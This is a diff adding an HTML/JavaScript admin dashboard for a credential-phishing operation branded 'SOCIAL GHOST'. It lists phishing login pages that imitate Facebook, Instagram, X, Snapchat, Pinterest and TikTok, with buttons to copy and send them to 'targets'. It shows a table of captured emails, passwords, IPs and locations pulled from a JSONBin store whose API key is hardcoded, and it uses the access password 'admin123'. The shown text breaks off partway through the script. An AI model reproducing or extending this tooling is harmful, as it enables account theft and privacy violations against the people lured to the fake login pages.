@@ -1,0 +1,1593 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SOCIAL GHOST v1.0</title>
+    <link rel="icon" href="https://i.ibb.co/dsfgCmhF/admin-dashboard.jpg">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
+        }
+        
+        body {
+            background: #000;
+            color: #0f0;
+            height: 100vh;
+            overflow: hidden;
+            position: relative;
+        }
+        
+        /* Matrix Rain Effect */
+        .matrix-rain {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: -2;
+            opacity: 0.15;
+        }
+        
+        /* Terminal Screen */
+        .terminal-screen {
+            background: rgba(0, 5, 0, 0.95);
+            padding: 20px;
+            height: 100vh;
+            overflow-y: auto;
+            position: relative;
+            z-index: 1;
+            box-shadow: inset 0 0 50px rgba(0, 255, 0, 0.1);
+        }
+        
+        .terminal-line {
+            margin-bottom: 5px;
+            text-shadow: 0 0 3px #0f0;
+            opacity: 0.9;
+        }
+        
+        .prompt {
+            color: #0f0;
+            font-weight: bold;
+        }
+        
+        .cursor {
+            display: inline-block;
+            width: 8px;
+            height: 16px;
+            background: #0f0;
+            animation: blink 1s infinite;
+            margin-left: 2px;
+            box-shadow: 0 0 5px #0f0;
+        }
+        
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0; }
+        }
+        
+        .password-input {
+            background: transparent;
+            border: none;
+            color: #0f0;
+            font-family: 'Courier New', monospace;
+            font-size: 16px;
+            outline: none;
+            width: 200px;
+            text-shadow: 0 0 3px #0f0;
+        }
+        
+        .hidden {
+            display: none !important;
+        }
+        
+        /* Access Denied */
+        .access-denied {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        
+        .glitch {
+            position: relative;
+            animation: glitch 3s infinite;
+        }
+        
+        @keyframes glitch {
+            0% { 
+                text-shadow: 0.05em 0 0 #f00, -0.03em -0.04em 0 #0ff;
+                transform: translate(0);
+            }
+            2% { transform: translate(-2px, 2px); }
+            4% { transform: translate(2px, -2px); }
+            6% { transform: translate(-2px, -2px); }
+            8% { transform: translate(2px, 2px); }
+            10% { transform: translate(0); }
+            100% { transform: translate(0); }
+        }
+        
+        /* Dashboard */
+        .dashboard {
+            display: none;
+            height: 100vh;
+            overflow: hidden;
+            position: relative;
+        }
+        
+        /* Sidebar */
+        .sidebar {
+            position: fixed;
+            left: 0;
+            top: 0;
+            width: 280px;
+            height: 100vh;
+            background: rgba(0, 20, 0, 0.9);
+            border-right: 1px solid #0f0;
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.2);
+            z-index: 2;
+            overflow-y: auto;
+        }
+        
+        .sidebar-header {
+            padding: 20px;
+            border-bottom: 1px solid #0f0;
+            text-align: center;
+        }
+        
+        .sidebar-title {
+            color: #0f0;
+            font-size: 14px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            margin-bottom: 5px;
+            text-shadow: 0 0 5px #0f0;
+        }
+        
+        .sidebar-subtitle {
+            color: #8f8;
+            font-size: 11px;
+            opacity: 0.7;
+        }
+        
+        .stats-grid {
+            padding: 20px;
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 15px;
+        }
+        
+        .stat-card {
+            background: rgba(0, 30, 0, 0.6);
+            border: 1px solid #0f0;
+            border-radius: 5px;
+            padding: 15px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .stat-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(0, 255, 0, 0.1), transparent);
+            animation: scan 2s infinite;
+        }
+        
+        @keyframes scan {
+            0% { left: -100%; }
+            100% { left: 100%; }
+        }
+        
+        .stat-card h3 {
+            color: #8f8;
+            font-size: 11px;
+            margin-bottom: 10px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        
+        .stat-number {
+            font-size: 28px;
+            color: #0f0;
+            font-weight: bold;
+            text-shadow: 0 0 10px #0f0;
+        }
+        
+        /* Right Navigation Bar */
+        .right-nav {
+            position: fixed;
+            right: 0;
+            top: 0;
+            width: 60px;
+            height: 100vh;
+            background: rgba(0, 20, 0, 0.9);
+            border-left: 1px solid #0f0;
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.2);
+            z-index: 2;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding-top: 20px;
+            transition: width 0.3s ease;
+            overflow: hidden;
+        }
+        
+        .right-nav:hover {
+            width: 300px;
+        }
+        
+        .nav-toggle {
+            color: #0f0;
+            font-size: 24px;
+            margin-bottom: 30px;
+            cursor: pointer;
+            text-align: center;
+            width: 100%;
+        }
+        
+        .nav-title {
+            color: #0f0;
+            font-size: 12px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            margin-bottom: 20px;
+            text-align: center;
+            white-space: nowrap;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+        
+        .right-nav:hover .nav-title {
+            opacity: 1;
+        }
+        
+        .login-links {
+            width: 100%;
+            padding: 0 10px;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+        
+        .login-link-item {
+            background: rgba(0, 30, 0, 0.6);
+            border: 1px solid #0f0;
+            border-radius: 5px;
+            padding: 10px;
+            cursor: pointer;
+            transition: all 0.3s;
+            white-space: nowrap;
+            opacity: 0;
+            transform: translateX(20px);
+            transition: all 0.3s ease;
+        }
+        
+        .right-nav:hover .login-link-item {
+            opacity: 1;
+            transform: translateX(0);
+        }
+        
+        .login-link-item:hover {
+            background: rgba(0, 60, 0, 0.8);
+            box-shadow: 0 0 10px #0f0;
+            transform: translateX(-2px);
+        }
+        
+        .link-service {
+            color: #0f0;
+            font-size: 11px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 5px;
+        }
+        
+        .link-url {
+            color: #8f8;
+            font-size: 10px;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            font-family: monospace;
+        }
+        
+        .copy-btn {
+            background: rgba(0, 40, 0, 0.8);
+            color: #0f0;
+            border: 1px solid #0f0;
+            padding: 3px 8px;
+            border-radius: 3px;
+            font-size: 9px;
+            cursor: pointer;
+            margin-top: 5px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            transition: all 0.3s;
+        }
+        
+        .copy-btn:hover {
+            background: rgba(0, 60, 0, 0.8);
+            box-shadow: 0 0 5px #0f0;
+        }
+        
+        /* Main Content */
+        .main-content {
+            margin-left: 280px;
+            margin-right: 60px;
+            height: 100vh;
+            overflow: hidden;
+            position: relative;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .header {
+            background: rgba(0, 30, 0, 0.8);
+            padding: 20px;
+            border-bottom: 1px solid #0f0;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: sticky;
+            top: 0;
+            z-index: 1;
+            box-shadow: 0 2px 10px rgba(0, 255, 0, 0.1);
+        }
+        
+        .header-title {
+            font-size: 18px;
+            color: #0f0;
+            text-shadow: 0 0 5px #0f0;
+            letter-spacing: 1px;
+        }
+        
+        .header-status {
+            display: flex;
+            gap: 20px;
+            font-size: 12px;
+            color: #8f8;
+        }
+        
+        .status-item {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+        
+        .status-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: #0f0;
+            box-shadow: 0 0 5px #0f0;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+        
+        /* Controls */
+        .controls {
+            padding: 20px;
+            display: flex;
+            gap: 15px;
+            flex-wrap: wrap;
+            border-bottom: 1px solid rgba(0, 255, 0, 0.2);
+        }
+        
+        .control-btn {
+            background: rgba(0, 40, 0, 0.8);
+            color: #0f0;
+            border: 1px solid #0f0;
+            padding: 10px 20px;
+            border-radius: 3px;
+            cursor: pointer;
+            font-size: 12px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            transition: all 0.3s;
+        }
+        
+        .control-btn:hover {
+            background: rgba(0, 60, 0, 0.8);
+            box-shadow: 0 0 10px #0f0;
+            transform: translateY(-1px);
+        }
+        
+        .control-btn.danger {
+            color: #f00;
+            border-color: #f00;
+            background: rgba(40, 0, 0, 0.8);
+        }
+        
+        .control-btn.danger:hover {
+            box-shadow: 0 0 10px #f00;
+        }
+        
+        /* Data Table */
+        .data-container {
+            flex: 1;
+            overflow: auto;
+            position: relative;
+        }
+        
+        .data-table {
+            width: 100%;
+            border-collapse: collapse;
+            min-width: 1200px;
+        }
+        
+        .data-table th {
+            background: rgba(0, 40, 0, 0.8);
+            color: #0f0;
+            padding: 15px;
+            text-align: left;
+            border-bottom: 2px solid #0f0;
+            font-size: 12px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            position: sticky;
+            top: 0;
+            z-index: 1;
+        }
+        
+        .data-table td {
+            padding: 15px;
+            border-bottom: 1px solid rgba(0, 255, 0, 0.1);
+            color: #0f0;
+            font-size: 12px;
+        }
+        
+        .data-table tr:hover {
+            background: rgba(0, 255, 0, 0.05);
+            box-shadow: inset 0 0 10px rgba(0, 255, 0, 0.1);
+        }
+        
+        /* Service Badges */
+        .service-badge {
+            display: inline-block;
+            padding: 4px 10px;
+            border-radius: 12px;
+            font-size: 10px;
+            font-weight: bold;
+            text-align: center;
+            min-width: 70px;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+        }
+        
+        .service-facebook {
+            background: #1877f2;
+            color: white;
+            box-shadow: 0 0 5px #1877f2;
+        }
+        
+        .service-instagram {
+            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
+            color: white;
+            box-shadow: 0 0 5px #dc2743;
+        }
+        
+        .service-twitter {
+            background: #000;
+            color: white;
+            border: 1px solid #333;
+            box-shadow: 0 0 5px #1da1f2;
+        }
+        
+        .service-snapchat {
+            background: #fffc00;
+            color: #000;
+            box-shadow: 0 0 5px #fffc00;
+        }
+        
+        .service-pinterest {
+            background: #e60023;
+            color: white;
+            box-shadow: 0 0 5px #e60023;
+        }
+        
+        .service-tiktok {
+            background: #000000;
+            color: white;
+            box-shadow: 0 0 5px #000000;
+            border: 1px solid #333;
+        }
+        
+        .timestamp {
+            color: #8f8;
+            font-size: 11px;
+            font-family: monospace;
+        }
+        
+        .email {
+            color: #0ff;
+            text-shadow: 0 0 3px #0ff;
+        }
+        
+        .username {
+            color: #f0f;
+            text-shadow: 0 0 3px #f0f;
+        }
+        
+        .password {
+            color: #ff0;
+            font-weight: bold;
+            background: rgba(255, 255, 0, 0.1);
+            padding: 3px 8px;
+            border-radius: 3px;
+            font-family: monospace;
+            letter-spacing: 1px;
+        }
+        
+        .ip {
+            color: #f0f;
+            font-family: monospace;
+            font-size: 11px;
+        }
+        
+        .country {
+            color: #0f0;
+            font-size: 11px;
+        }
+        
+        /* Loading */
+        .loading {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            text-align: center;
+            color: #0f0;
+        }
+        
+        .loading-dots {
+            display: inline-block;
+            animation: dots 1.5s infinite;
+        }
+        
+        @keyframes dots {
+            0%, 20% { content: '.'; }
+            40% { content: '..'; }
+            60%, 100% { content: '...'; }
+        }
+        
+        /* No Data */
+        .no-data {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            text-align: center;
+            color: #8f8;
+            font-size: 14px;
+        }
+        
+        /* Scan Lines */
+        .scan-lines {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(
+                to bottom,
+                transparent 50%,
+                rgba(0, 255, 0, 0.03) 50%
+            );
+            background-size: 100% 4px;
+            z-index: -1;
+            pointer-events: none;
+        }
+        
+        /* New Data Notification */
+        .new-data-notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: rgba(0, 40, 0, 0.95);
+            border: 1px solid #0f0;
+            border-radius: 5px;
+            padding: 15px 20px;
+            color: #0f0;
+            font-size: 12px;
+            display: none;
+            z-index: 1000;
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.3);
+            animation: slideIn 0.3s ease-out, bellRing 0.5s 3;
+        }
+        
+        @keyframes slideIn {
+            from { transform: translateX(100%); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
+        }
+        
+        @keyframes bellRing {
+            0%, 100% { transform: rotate(0deg); }
+            25% { transform: rotate(10deg); }
+            75% { transform: rotate(-10deg); }
+        }
+        
+        .notification-icon {
+            margin-right: 10px;
+            font-size: 16px;
+            display: inline-block;
+            animation: bellSwing 0.5s 3;
+        }
+        
+        @keyframes bellSwing {
+            0%, 100% { transform: rotate(0deg); }
+            25% { transform: rotate(15deg); }
+            75% { transform: rotate(-15deg); }
+        }
+        
+        /* Footer */
+        .dashboard-footer {
+            padding: 15px 20px;
+            text-align: center;
+            border-top: 1px solid rgba(0, 255, 0, 0.3);
+            background: rgba(0, 20, 0, 0.8);
+            font-size: 12px;
+            color: #8f8;
+            margin-top: auto;
+        }
+        
+        .dashboard-footer a {
+            color: #0f0;
+            text-decoration: none;
+            font-weight: bold;
+            transition: all 0.3s;
+        }
+        
+        .dashboard-footer a:hover {
+            text-shadow: 0 0 5px #0f0;
+            text-decoration: underline;
+        }
+        
+        /* Responsive */
+        @media (max-width: 1024px) {
+            .sidebar {
+                width: 240px;
+            }
+            
+            .main-content {
+                margin-left: 240px;
+                margin-right: 60px;
+            }
+            
+            .data-table {
+                min-width: 1000px;
+            }
+        }
+        
+        @media (max-width: 768px) {
+            .sidebar {
+                width: 200px;
+            }
+            
+            .main-content {
+                margin-left: 200px;
+                margin-right: 60px;
+            }
+            
+            .header {
+                flex-direction: column;
+                gap: 10px;
+                text-align: center;
+            }
+            
+            .header-status {
+                justify-content: center;
+            }
+            
+            .controls {
+                justify-content: center;
+            }
+            
+            .data-table {
+                min-width: 900px;
+            }
+            
+            .right-nav {
+                width: 50px;
+            }
+            
+            .right-nav:hover {
+                width: 250px;
+            }
+        }
+        
+        @media (max-width: 600px) {
+            .sidebar {
+                position: relative;
+                width: 100%;
+                height: auto;
+                max-height: 40vh;
+            }
+            
+            .right-nav {
+                position: relative;
+                width: 100%;
+                height: auto;
+                max-height: 30vh;
+                margin-top: 10px;
+            }
+            
+            .right-nav:hover {
+                width: 100%;
+            }
+            
+            .main-content {
+                margin-left: 0;
+                margin-right: 0;
+                height: auto;
+                min-height: 60vh;
+            }
+            
+            .stats-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+            
+            .data-container {
+                height: 50vh;
+            }
+        }
+        
+        @media (max-width: 480px) {
+            .stats-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .control-btn {
+                padding: 8px 12px;
+                font-size: 10px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Matrix Rain -->
+    <canvas class="matrix-rain" id="matrixCanvas"></canvas>
+    <div class="scan-lines"></div>
+    
+    <!-- New Data Notification -->
+    <div class="new-data-notification" id="newDataNotification">
+        <span class="notification-icon">🔔</span>
+        <span id="notificationText">New credentials captured!</span>
+    </div>
+    
+    <!-- Terminal Authentication -->
+    <div class="terminal-screen" id="terminalScreen">
+        <div class="terminal-line">╔═══════════════════════════════════════════════════════╗</div>
+        <div class="terminal-line">║                                                       ║</div>
+        <div class="terminal-line">║    ███████╗ ██████╗  ██████╗██╗ █████╗ ██╗            ║</div>
+        <div class="terminal-line">║    ██╔════╝██╔═══██╗██╔════╝██║██╔══██╗██║            ║</div>
+        <div class="terminal-line">║    ███████╗██║   ██║██║     ██║███████║██║            ║</div>
+        <div class="terminal-line">║    ╚════██║██║   ██║██║     ██║██╔══██║██║            ║</div>
+        <div class="terminal-line">║    ███████║╚██████╔╝╚██████╗██║██║  ██║██║            ║</div>
+        <div class="terminal-line">║    ╚══════╝ ╚═════╝  ╚═════╝╚═╝╚═╝  ╚═╝╚═╝            ║</div>
+        <div class="terminal-line">║                                                       ║</div>
+        <div class="terminal-line">║     ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗         ║</div>
+        <div class="terminal-line">║    ██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝         ║</div>
+        <div class="terminal-line">║    ██║  ███╗███████║██║   ██║███████╗   ██║            ║</div>
+        <div class="terminal-line">║    ██║   ██║██╔══██║██║   ██║╚════██║   ██║            ║</div>
+        <div class="terminal-line">║    ╚██████╔╝██║  ██║╚██████╔╝███████║   ██║            ║</div>
+        <div class="terminal-line">║     ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝            ║</div>
+        <div class="terminal-line">║                                                       ║</div>
+        <div class="terminal-line">║            SOCIAL GHOST v1.0 - STEALTH MODE           ║</div>
+        <div class="terminal-line">║                                                       ║</div>
+        <div class="terminal-line">╚═══════════════════════════════════════════════════════╝</div>
+        <div class="terminal-line">&nbsp;</div>
+        <div class="terminal-line">[SYSTEM] Initializing stealth protocol...</div>
+        <div class="terminal-line">[SECURITY] Establishing encrypted connection...</div>
+        <div class="terminal-line">[NETWORK] Connection established - Ghost protocol active</div>
+        <div class="terminal-line">[AUTHENTICATION] Stealth mode - Password required</div>
+        <div class="terminal-line">&nbsp;</div>
+        <div class="terminal-line">
+            <span class="prompt">ghost@stealth-net:~# </span>
+            <span id="commandLine"></span>
+            <span class="cursor" id="cursor"></span>
+        </div>
+        <div class="terminal-line" id="outputLine"></div>
+        <div class="terminal-line hidden" id="passwordPrompt">
+            <span class="prompt">[ACCESS_CODE]: </span>
+            <input type="password" class="password-input" id="passwordInput" autocomplete="off">
+            <span class="cursor"></span>
+        </div>
+        <div class="terminal-line" id="statusLine"></div>
+    </div>
+    
+    <!-- Access Denied -->
+    <div class="access-denied hidden" id="accessDenied">
+        <div class="glitch" style="font-size: 32px; margin-bottom: 30px;">⚠ INTRUSION DETECTED ⚠</div>
+        <div class="glitch" style="font-size: 24px; margin-bottom: 20px;">UNAUTHORIZED ACCESS ATTEMPT</div>
+        <div style="color: #f00; font-size: 18px; margin-bottom: 30px;">STEALTH TERMINAL LOCKED</div>
+        <div style="color: #ff0; font-size: 48px; margin-bottom: 30px;" id="countdown">10</div>
+        <div style="color: #8f8; font-size: 14px;">[WARNING] All traces will be erased in: <span id="countdownSeconds">10</span> seconds</div>
+    </div>
+    
+    <!-- Dashboard -->
+    <div class="dashboard" id="dashboard">
+        <!-- Left Sidebar -->
+        <div class="sidebar">
+            <div class="sidebar-header">
+                <div class="sidebar-title">SOCIAL GHOST NETWORK</div>
+                <div class="sidebar-subtitle">CREDENTIALS DATABASE v1.0</div>
+                <div class="sidebar-subtitle" style="margin-top: 10px; color: #0f0;" id="lastUpdateTime">--:--:--</div>
+            </div>
+            
+            <div class="stats-grid">
+                <div class="stat-card">
+                    <h3>🌐 TOTAL CAPTURES</h3>
+                    <div class="stat-number" id="totalCaptures">0</div>
+                </div>
+                <div class="stat-card">
+                    <h3>📊 TODAY'S ACTIVITY</h3>
+                    <div class="stat-number" id="todayCaptures">0</div>
+                </div>
+                <div class="stat-card">
+                    <h3>📍 GEO LOCATIONS</h3>
+                    <div class="stat-number" id="uniqueCountries">0</div>
+                </div>
+                <div class="stat-card">
+                    <h3>📘 FACEBOOK</h3>
+                    <div class="stat-number" id="facebookCount">0</div>
+                </div>
+                <div class="stat-card">
+                    <h3>📸 INSTAGRAM</h3>
+                    <div class="stat-number" id="instagramCount">0</div>
+                </div>
+                <div class="stat-card">
+                    <h3>🐦 X/TWITTER</h3>
+                    <div class="stat-number" id="twitterCount">0</div>
+                </div>
+                <div class="stat-card">
+                    <h3>👻 SNAPCHAT</h3>
+                    <div class="stat-number" id="snapchatCount">0</div>
+                </div>
+                <div class="stat-card">
+                    <h3>📌 PINTEREST</h3>
+                    <div class="stat-number" id="pinterestCount">0</div>
+                </div>
+                <div class="stat-card">
+                    <h3>🎵 TIKTOK</h3>
+                    <div class="stat-number" id="tiktokCount">0</div>
+                </div>
+                <div class="stat-card">
+                    <h3>⚡ LAST CAPTURE</h3>
+                    <div class="stat-number" id="lastCaptureTime">--:--</div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Right Navigation Bar -->
+        <div class="right-nav" id="rightNav">
+            <div class="nav-toggle">⚙️</div>
+            <div class="nav-title">LOGIN LINKS</div>
+            <div class="login-links">
+                <div class="login-link-item" data-url="https://facebook-login-l.vercel.app/">
+                    <div class="link-service">FACEBOOK</div>
+                    <div class="link-url">facebook-login-l.vercel.app</div>
+                    <button class="copy-btn" onclick="copyLink('https://facebook-login-l.vercel.app/')">COPY</button>
+                </div>
+                <div class="login-link-item" data-url="https://instagram-roan-eta.vercel.app/">
+                    <div class="link-service">INSTAGRAM</div>
+                    <div class="link-url">instagram-roan-eta.vercel.app</div>
+                    <button class="copy-btn" onclick="copyLink('https://instagram-roan-eta.vercel.app/')">COPY</button>
+                </div>
+                <div class="login-link-item" data-url="https://x-login-l.vercel.app/">
+                    <div class="link-service">X/TWITTER</div>
+                    <div class="link-url">x-login-l.vercel.app</div>
+                    <button class="copy-btn" onclick="copyLink('https://x-login-l.vercel.app/')">COPY</button>
+                </div>
+                <div class="login-link-item" data-url="https://pinterest-login-l.vercel.app/">
+                    <div class="link-service">PINTEREST</div>
+                    <div class="link-url">pinterest-login-l.vercel.app</div>
+                    <button class="copy-btn" onclick="copyLink('https://pinterest-login-l.vercel.app/')">COPY</button>
+                </div>
+                <div class="login-link-item" data-url="https://tiktok-login-l.vercel.app/">
+                    <div class="link-service">TIKTOK</div>
+                    <div class="link-url">tiktok-login-l.vercel.app</div>
+                    <button class="copy-btn" onclick="copyLink('https://tiktok-login-l.vercel.app/')">COPY</button>
+                </div>
+                <div class="login-link-item" data-url="https://snapchat-login-l.vercel.app/">
+                    <div class="link-service">SNAPCHAT</div>
+                    <div class="link-url">snapchat-login-l.vercel.app</div>
+                    <button class="copy-btn" onclick="copyLink('https://snapchat-login-l.vercel.app/')">COPY</button>
+                </div>
+                <div class="login-link-item" style="margin-top: 20px; background: rgba(20, 0, 0, 0.6); border-color: #f00;">
+                    <div class="link-service" style="color: #f00;">⚠️ WARNING</div>
+                    <div class="link-url" style="color: #f88; font-size: 9px;">Send links carefully</div>
+                    <div class="link-url" style="color: #f88; font-size: 9px; margin-top: 5px;">Targets only</div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Main Content -->
+        <div class="main-content">
+            <!-- Header -->
+            <div class="header">
+                <div class="header-title">█▓▒░ LIVE DATA STREAM - STEALTH MODE ACTIVE ░▒▓█</div>
+                <div class="header-status">
+                    <div class="status-item">
+                        <div class="status-dot"></div>
+                        <span>STEALTH</span>
+                    </div>
+                    <div class="status-item">
+                        <div class="status-dot"></div>
+                        <span>ENCRYPTED</span>
+                    </div>
+                    <div class="status-item">
+                        <div class="status-dot"></div>
+                        <span>ACTIVE</span>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Controls -->
+            <div class="controls">
+                <button class="control-btn" onclick="loadData(true)">
+                    🔄 SYNC DATABASE
+                </button>
+                <button class="control-btn" onclick="exportData()">
+                    💾 EXPORT DATA
+                </button>
+                <button class="control-btn danger" onclick="clearAll()">
+                    ⚠️ PURGE DATABASE
+                </button>
+                <button class="control-btn" onclick="toggleAutoRefresh()" id="autoRefreshBtn">
+                    ⏰ AUTO REFRESH: ON
+                </button>
+                <button class="control-btn" onclick="filterByService('all')" id="filterAll">
+                    🌐 ALL SERVICES
+                </button>
+                <button class="control-btn" onclick="filterByService('facebook')">
+                    📘 FACEBOOK
+                </button>
+                <button class="control-btn" onclick="filterByService('instagram')">
+                    📸 INSTAGRAM
+                </button>
+                <button class="control-btn" onclick="filterByService('twitter')">
+                    🐦 X/TWITTER
+                </button>
+                <button class="control-btn" onclick="filterByService('snapchat')">
+                    👻 SNAPCHAT
+                </button>
+                <button class="control-btn" onclick="filterByService('pinterest')">
+                    📌 PINTEREST
+                </button>
+                <button class="control-btn" onclick="filterByService('tiktok')">
+                    🎵 TIKTOK
+                </button>
+            </div>
+            
+            <!-- Data Table -->
+            <div class="data-container">
+                <div class="loading" id="loading">
+                    <div>LOADING DATABASE RECORDS</div>
+                    <div class="loading-dots"></div>
+                </div>
+                
+                <div class="no-data hidden" id="noData">
+                    ⚠ NO DATA CAPTURED YET<br>
+                    <span style="font-size: 12px; color: #8f8;">Awaiting credentials...</span>
+                </div>
+                
+                <table class="data-table hidden" id="dataTable">
+                    <thead>
+                        <tr>
+                            <th>🕒 TIMESTAMP</th>
+                            <th>🔧 SERVICE</th>
+                            <th>📧 EMAIL / USERNAME</th>
+                            <th>🔑 PASSWORD</th>
+                            <th>🌐 IP ADDRESS</th>
+                            <th>📍 LOCATION</th>
+                            <th>📡 ISP</th>
+                            <th>⏰ TIMEZONE</th>
+                        </tr>
+                    </thead>
+                    <tbody id="tableBody"></tbody>
+                </table>
+            </div>
+            
+            <!-- Footer -->
+            <div class="dashboard-footer">
+                Developed with ♥️ by <a href="https://t.me/vetoboy" target="_blank" rel="noopener noreferrer">VETO BOY</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Configuration
+        const JSONBIN_API_KEY = '$2a$10$awAim7VUUgiDiyPrJB5uOOslfiCc8YReIqiSpkMevLcwyHYZ1jdju';
+        const JSONBIN_BIN_ID = '69c2e1a3b7ec241ddc9c8810';
+        const JSONBIN_URL = `https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}`;
+        const ACCESS_PASSWORD = "admin123";
+        
+        // Login Links
+        const LOGIN_LINKS = [
+            { service: 'Facebook', url: 'https://facebook-login-l.vercel.app/' },
+            { service: 'Instagram', url: 'https://instagram-roan-eta.vercel.app/' },
+            { service: 'X/Twitter', url: 'https://x-login-l.vercel.app/' },
+            { service: 'Pinterest', url: 'https://pinterest-login-l.vercel.app/' },
+            { service: 'TikTok', url: 'https://tiktok-login-l.vercel.app/' },
+            { service: 'Snapchat', url: 'https://snapchat-login-l.vercel.app/' }
+        ];
+        
+        // State
+        let allData = [];
+        let previousDataCount = 0;
+        let autoRefresh = true;
+        let autoRefreshInterval;
+        let currentFilter = 'all';
+        
+        // Copy link function
+        function copyLink(url) {
+            navigator.clipboard.writeText(url)
+                .then(() => {
+                    showNotification(`Link copied: ${url}`);
+                })
+                .catch(err => {
+                    console.error('Failed to copy:', err);
+                    showNotification('Failed to copy link');
+                });
+        }
+        
+        // Create bell sound for notification
+        function createBellSound() {
+            try {
+                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+                const oscillator = audioContext.createOscillator();
+                const gainNode = audioContext.createGain();
+                
+                oscillator.connect(gainNode);
+                gainNode.connect(audioContext.destination);
+                
+                oscillator.frequency.setValueAtTime(800, audioContext.currentTime);
+                oscillator.frequency.setValueAtTime(1200, audioContext.currentTime + 0.1);
+                oscillator.frequency.setValueAtTime(800, audioContext.currentTime + 0.2);
+                
+                gainNode.gain.setValueAtTime(0.3, audioContext.currentTime);
+                gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.6);
+                
+                oscillator.start(audioContext.currentTime);
+                oscillator.stop(audioContext.currentTime + 0.6);
+            } catch (error) {
+                console.log('Audio not available for bell sound');
+            }
+        }
+        
+        // Show notification when new data arrives
+        function showNotification(message) {
+            const notification = document.getElementById('newDataNotification');
+            const notificationText = document.getElementById('notificationText');
+            
+            notificationText.textContent = message;
+            notification.style.display = 'block';
+            
+            createBellSound();
+            
+            setTimeout(() => {
+                notification.style.display = 'none';
+            }, 4000);
+        }
+        
+        // Matrix Rain Effect
+        const canvas = document.getElementById('matrixCanvas');
+        const ctx = canvas.getContext('2d');
+        
+        function resizeCanvas() {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+        }
+        
+        resizeCanvas();
+        window.addEventListener('resize', resizeCanvas);
+        
+        const chars = "01";
+        const charArray = chars.split("");
+        const fontSize = 14;
+        const columns = canvas.width / fontSize;
+        const drops = Array(Math.floor(columns)).fill(1);
+        
+        function drawMatrix() {
+            ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            
+            ctx.fillStyle = "#0F0";
+            ctx.font = `bold ${fontSize}px monospace`;
+            
+            for (let i = 0; i < drops.length; i++) {
+                const text = charArray[Math.floor(Math.random() * charArray.length)];
+                const y = drops[i] * fontSize;
+                
+                const gradient = ctx.createLinearGradient(0, y, 0, y + fontSize);
+                gradient.addColorStop(0, '#0F0');
+                gradient.addColorStop(1, '#080');
+                
+                ctx.fillStyle = gradient;
+                ctx.fillText(text, i * fontSize, y);
+                
+                if (y > canvas.height && Math.random() > 0.975) {
+                    drops[i] = 0;
+                }
+                drops[i]++;
+            }
+        }
+        
+        const matrixInterval = setInterval(drawMatrix, 35);
+        
+        // Terminal Authentication
+        document.addEventListener('DOMContentLoaded', function() {
+            startTerminalSequence();
+        });
+        
+        function startTerminalSequence() {
+            const commandLine = document.getElementById('commandLine');
+            const outputLine = document.getElementById('outputLine');
+            const statusLine = document.getElementById('statusLine');
+            const cursor = document.getElementById('cursor');
+            
+            let command = "access ghost_net --protocol stealth";
+            let index = 0;
+            
+            function typeCommand() {
+                if (index < command.length) {
+                    commandLine.textContent += command.charAt(index);
+                    index++;
+                    setTimeout(typeCommand, 40);
+                } else {
+                    setTimeout(() => {
